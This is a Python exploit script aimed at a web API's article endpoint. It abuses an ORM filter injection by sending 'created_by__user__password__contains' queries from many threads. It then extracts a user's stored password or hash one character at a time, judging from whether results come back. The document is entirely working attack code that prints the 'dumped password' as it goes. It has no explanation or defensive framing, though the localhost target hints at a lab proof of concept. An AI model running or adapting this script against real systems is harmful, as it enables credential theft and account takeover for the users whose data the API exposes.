import requests, string, sys
import urllib.parse as urlparse
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, Future

TARGET = "http://127.0.0.1:8000/api/articles/"
CHARS = string.ascii_letters + string.digits + "$/=+_"
THREADS = 20

def worker(test_substring_value: str) -> tuple[bool, str]:
    r = requests.post(
        TARGET,
        json={
            "created_by__user__password__contains": test_substring_value
        }
    )
    r_json: dict = r.json()
    return len(r_json) > 0, test_substring_value

def main():
    dumped_value = ""
    print(f"\r{Fore.RED}dumped password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
    sys.stdout.flush()
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = []
            for test_char in CHARS:
                # Since we are using a contains operator, need to add the test char on both sides
                job_suffix = executor.submit(
                    worker,
                    dumped_value + test_char
                )
                futures.append(job_suffix)

                job_prefix = executor.submit(
                    worker,
                    test_char + dumped_value
                )
                futures.append(job_prefix)

            future: Future
            for future in futures:
                result = future.result()
                was_success = result[0]
                test_substring = result[1]
                print(f"\r{Fore.RED}dumped password: {Fore.YELLOW}{Style.BRIGHT}{test_substring}{Style.RESET_ALL}", end="")
                sys.stdout.flush()
                if was_success:
                    found = True
                    dumped_value = test_substring
                    break

        if not found:
            break
    print(f"\r{Fore.RED}dumped password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value} {Style.RESET_ALL}")

if __name__ == "__main__":
    main()
